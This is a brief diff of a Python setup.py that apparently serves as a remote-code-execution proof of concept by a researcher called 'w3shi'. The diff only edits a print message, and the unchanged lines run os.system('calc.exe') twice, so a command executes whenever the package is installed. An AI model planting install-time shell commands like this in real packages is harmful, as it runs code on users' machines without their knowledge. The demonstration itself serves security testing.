@@ -1,7 +1,7 @@
 import os
 from setuptools import setup
 
-print("RCE triggered by w3shi (S.Lakshmi Vignesh)")
+print("RCE poc triggered by w3shi ")
 
 os.system("calc.exe")
 os.system("calc.exe")
